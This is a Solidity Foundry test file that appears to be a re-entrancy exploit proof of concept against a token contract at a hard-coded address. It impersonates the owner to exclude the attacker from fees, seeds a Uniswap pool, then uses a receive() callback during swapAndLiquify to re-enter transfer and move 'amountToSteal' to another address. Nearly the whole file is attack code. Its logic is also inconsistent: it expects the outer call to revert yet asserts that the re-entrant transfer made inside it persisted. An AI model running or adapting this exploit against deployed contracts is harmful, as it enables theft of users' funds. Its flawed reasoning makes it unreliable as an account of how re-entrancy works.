// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface LiquidityGeneratorToken is IERC20 {
    function uniswapV2Router() external view returns (address);
    function owner() external view returns (address);
    function excludeFromFee(address account) external;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address owner;

    address constant TARGET = 0xE2C9C976337357369845c761DD851E2B6942D69f;
    address attacker = address(this);
    LiquidityGeneratorToken private token;
    IUniswapV2Router02 private router;
    IWETH private weth;
    uint256 private amountToSteal;
    bool private isAttacking;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        token = LiquidityGeneratorToken(TARGET);
                router = IUniswapV2Router02(token.uniswapV2Router());
                weth = IWETH(router.WETH());

                // Gain owner privileges to modify fee settings
                owner = token.owner();
                vm.startPrank(owner);

                // Exclude the attacker from fees to reduce gas consumption and prevent timeouts
                token.excludeFromFee(address(this));

                vm.stopPrank();

                // Use large values for liquidity
                uint256 initialLiquidityTokens = 1e22;
                uint256 initialLiquidityETH = 100 ether;

                deal(address(this), initialLiquidityETH + 1 ether);
                weth.deposit{value: initialLiquidityETH}();

                // Determine token amounts needed
                amountToSteal = 100_000 * 1e9;
                uint256 numTokensToLiquify = uint256(vm.load(TARGET, bytes32(uint256(20))));

                // Deal all necessary tokens to the attacker
                deal(address(token), address(this), initialLiquidityTokens + amountToSteal + numTokensToLiquify);

                // Create the liquidity pool
                token.approve(address(router), type(uint256).max);
                weth.approve(address(router), type(uint256).max);
                router.addLiquidity(
                    address(token),
                    address(weth),
                    initialLiquidityTokens,
                    initialLiquidityETH,
                    0,
                    0,
                    address(this),
                    block.timestamp
                );

                // Arm the swapAndLiquify mechanism
                token.transfer(TARGET, numTokensToLiquify);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        isAttacking = true;

                uint256 beefBalanceBefore = token.balanceOf(address(0xbeef));

                // This call triggers swapAndLiquify and the re-entrancy.
                // It is expected to revert because the re-entrant call drains the balance,
                // causing the final subtraction in this outer call to underflow.
                vm.expectRevert();
                token.transfer(address(0xdead), amountToSteal);

                uint256 beefBalanceAfter = token.balanceOf(address(0xbeef));
                // Assert that the re-entrant transfer was successful despite the outer revert.
                assertGt(beefBalanceAfter, beefBalanceBefore);
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {
        if (isAttacking) {
            isAttacking = false;
            // Re-entrant call to transfer our entire balance before it's debited by the outer call.
            token.transfer(address(0xbeef), amountToSteal);
        }
    }
}

